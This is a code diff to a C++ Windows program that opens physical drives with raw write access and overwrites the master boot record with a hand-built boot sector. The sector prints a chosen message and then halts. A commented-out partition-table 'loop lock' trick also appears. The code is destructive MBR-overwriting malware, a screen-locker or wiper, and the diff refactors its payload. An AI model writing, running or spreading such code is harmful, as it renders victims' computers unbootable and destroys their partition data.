@@ -29,17 +29,19 @@ void GetPrivileges()
 }
 
 //写MBR
-bool WritePhydriveMBR(unsigned int id,char *msgstr)
+bool WritePhydriveMBR(unsigned int id,string msgstr)
 {
 	#pragma warning(push)
 	#pragma warning (disable:4309 4838)
 	static char pMBR[512] = { 0xB8,0x11,0x00,0xCD,0x10,0xBD,0x18,0x7C,0xB9,/*字符位数*/0x00,0x00,0xB8,0x01,0x13,0xBB,0x0C,0x00,0xBA,0x00,0x00,0xCD,0x10,0xEB,0xFE };
 	#pragma warning(pop)
 	static bool isfirstuse=true;
-	if (isfirstuse)
+	if (isfirstuse)//
 	{
+		//初始化MBR
+		
 		//改MBR中字符位数
-		pMBR[9] = static_cast<BYTE>(strlen(msgstr));
+		pMBR[9] = static_cast<char>(msgstr.size());
 		//加循环逻辑锁————已弃用！！！仅Win9x下有效果！！！
 		//pMBR[0x1BF] = 0x00;
 		//pMBR[0x1C2] = 0x05;
@@ -47,35 +49,41 @@ bool WritePhydriveMBR(unsigned int id,char *msgstr)
 		pMBR[510] = static_cast<char>(0x55);
 		pMBR[511] = static_cast<char>(0xAA);
 		//把提示字符写入MBR
-		strcpy_s(reinterpret_cast<char*>(pMBR + 24), 512, msgstr);
+		strcpy_s(reinterpret_cast<char *>(pMBR + 24), 512, msgstr.c_str());
 	}
 
 	//计算硬盘文件名称
-	TCHAR DriveName[32];
-	swprintf_s(DriveName,32,_T("\\\\.\\PHYSICALDRIVE%d"),id);
+	wstringstream wss;
+	wss << _T("\\\\.\\PHYSICALDRIVE") << id << flush;
 	//打开
 	HANDLE hFile;
-	hFile = CreateFile(DriveName, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+	hFile = CreateFile(wss.str().c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 	//用readfile来读取MBR
-	return WriteFile(hFile, pMBR, 512, NULL, NULL)==TRUE;
+	bool ret = WriteFile(hFile, pMBR, 512, NULL, NULL) == TRUE;
 	CloseHandle(hFile);
+	return ret;
 }
 
 //读MBR
-wstring ReadPhydriveMBR(unsigned int id)
+string ReadPhydriveMBR(unsigned int id)
 {
 	
-	TCHAR DriveName[32],pMBR[512];
+	char pMBR[512] = {};
+	wstringstream wss;
 	//计算硬盘文件名称
-	swprintf_s(DriveName, 32, _T("\\\\.\\PHYSICALDRIVE%d"), id);
+	wss << _T("\\\\.\\PHYSICALDRIVE") << id << flush;
 	//打开
 	HANDLE hFile;
-	hFile = CreateFile(DriveName, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+	hFile = CreateFile(wss.str().c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 	//用readfile来读取MBR
 	DWORD dwReadSize;
 	
-	return (ReadFile(hFile, pMBR, 512, &dwReadSize, NULL) == TRUE ? static_cast<wstring>(pMBR) : static_cast<wstring>(_T("")));
+	bool r_flag = ReadFile(hFile, pMBR, 512, &dwReadSize, NULL) == TRUE;
 	CloseHandle(hFile);
+	if (r_flag)
+		return static_cast<string>(pMBR);
+	else
+		return static_cast<string>("");
 }
 
 
